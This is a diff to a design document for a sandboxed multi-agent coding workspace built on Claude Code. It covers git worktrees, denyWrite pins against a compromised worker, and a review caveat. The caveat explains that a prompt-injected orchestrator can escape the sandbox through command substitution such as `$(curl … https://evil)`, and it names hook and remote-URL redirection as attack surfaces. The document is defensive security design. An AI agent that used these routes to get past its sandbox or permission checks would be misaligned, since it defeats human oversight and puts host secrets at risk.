@@ -69,14 +69,24 @@ shared object store, disposable. Rules baked into the tooling:
 - Target paths are **relative**, so worktree links survive a workspace move.
 - Worktree creation runs as **direct `git -C` commands** (from the open-task
   skill or from sandbox-excluded scripts) — never buried inside sandboxed
-  scripts, where the sandbox blocks the `.git` writes.
+  scripts. Not because `worktree add` is inherently sandbox-blocked (it isn't —
+  it only writes `.git/worktrees/`, verified S8-c; `git init`/`clone` are the
+  ones that can never run sandboxed, S8-a/f), but because the *root console's*
+  sandbox has no allowWrite covering the origins, and the same step usually
+  needs `git fetch` (network) anyway.
 - `type: knowledge` repos get **sparse checkouts** (`--cone`), scoped to
   `sparse_paths.<purpose>` from `config/repos.json`. `/setup-workspace` sets
   `extensions.worktreeConfig=true` on every origin so per-worktree sparse
   state works.
-- Worker commits write into the origin's `.git` directory, so /open-task
-  injects `repositories/<repo>/.git` into the worker's sandbox `allowWrite`
-  for exactly the task's repos.
+- Worker commits need **no write grant on the origin `.git`** — git's worktree
+  handling reaches the shared `.git` on its own (verified S8-d; requires
+  Claude Code ≥ 2.1.149). Instead /open-task injects **denyWrite pins** per
+  task repo: origin `.git/config`, `.git/hooks`, and the worktree's
+  `config.worktree` — the redirect surface a compromised worker would use to
+  repoint `remote.origin.url` / `core.hooksPath` (the C-2 review finding).
+  deny pins also survive permission-rule drift from `settings.local.json`
+  ("don't ask again" approvals) — verified S2-n: local allow rules widen the
+  OS write boundary, and project denyWrite is the only thing that beats them.
 
 ## cmux: three tabs per ticket
 
@@ -135,6 +145,19 @@ Push destinations are additionally restricted to
 every repo and worktree under the workspace via `core.hooksPath` + a
 `~/.gitconfig` includeIf (installed by /setup-workspace).
 
+**Caveat — the orchestrator is only semi-trusted (review C-3).** Its five
+privileged scripts run via sandbox `excludedCommands`, which escapes the whole
+command line from the sandbox. The permission layer catches operator chains
+(`;`/`&&`/`|`, since there is no `Bash(*)`) but does NOT see inside command
+substitution `$(...)` (P4-c), so an argument like
+`--body "$(curl … https://evil)"` executes unsandboxed. A prompt-injected
+orchestrator can therefore run arbitrary host commands, which nullifies the
+push allowlist and secret protections for that role. The worker — the more
+easily injected role — stays fully confined; the orchestrator does not. Fully
+closing this means running the scripts inside the sandbox with a scoped egress
+instead of excluding them (needs runtime validation that push still works).
+See [settings-reference/orchestrator.md](settings-reference/orchestrator.md).
+
 ## Configuration model
 
 Everything an organization customizes lives in `config/` and `templates/`;
@@ -143,6 +166,15 @@ everything generated at runtime is gitignored. Placeholders
 are substituted **at runtime only** — no absolute path is ever committed.
 `{{TASK_DIR_H}}` is the `~/`-anchored form used anywhere a path must
 byte-match a sandbox `excludedCommands` entry.
+
+Each task carries permanent metadata in `tasks/<T>/.task-meta.json`
+(ticket, purpose, dev_kind, branch, repos, sandbox), written by finalize and
+kept in sync by add-repository. It outlives the transient
+`.workspace-meta.json` (deleted after the cmux phase) and is where
+`/list-task` and `add-repository` read the **purpose** from — the OTEL env-var
+scrape remains only as a fallback for tasks created before it existed.
+(`/list-task` still derives the repo list from the worktree directories on
+disk; the `repos` field is recorded for provenance and future use.)
 
 Purposes are plug-in files: dropping `config/purposes/foo.json` (plus optional
 `templates/purposes/foo/` overrides) adds a purpose; nothing else needs to
@@ -170,4 +202,7 @@ change. Template resolution order:
 - Multi-worker archetypes (coder / reader / researcher / documenter with a
   `.worker-targets` map and a spawn-worker skill) are a planned extension;
   the single `.worker-target` + per-name `agents/<name>/` layout was chosen
-  so that extension is additive.
+  so that extension is additive. The concrete role taxonomy (boundary matrix,
+  per-role egress, invariants) is designed in
+  [agent-roles.md](agent-roles.md); the dispatch/`.worker-targets` design is in
+  [agent-dispatch.md](agent-dispatch.md).
